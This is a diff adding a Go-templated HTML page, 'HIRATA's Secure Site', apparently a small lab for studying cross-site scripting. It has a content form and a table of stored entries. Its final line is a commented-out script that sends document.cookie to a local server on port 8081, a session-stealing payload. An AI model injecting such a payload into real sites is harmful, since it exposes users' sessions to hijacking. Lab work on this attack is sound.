@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="UTF-8">
+  <title>HIRATA's Secure Site</title>
+</head>
+
+<body>
+  <h1>Welcome to Secure Page.</h1>
+  <form action="http://localhost:8080/send" method="post" style="padding-bottom: 1em;">
+    <label for="content">内容</label>
+    <input type="text" id="content" name="content">
+    <input type="submit" value="送信する">
+  </form>
+  <table border="1">
+    <tr>
+      <th>Name</th>
+      <th>Content</th>
+    </tr>
+    {{ range . }}
+    <tr>
+      <td>{{ .Name }}</td>
+      <td>{{ .Content }}</td>
+    </tr>
+    {{ end }}
+  </table>
+  <a href="http://localhost:8080/reset">RESET</a>
+</body>
+
+</html>
+
+<!-- <script>fetch("http://localhost:8081?sid=" + document.cookie, { method: "POST" })</script> -->
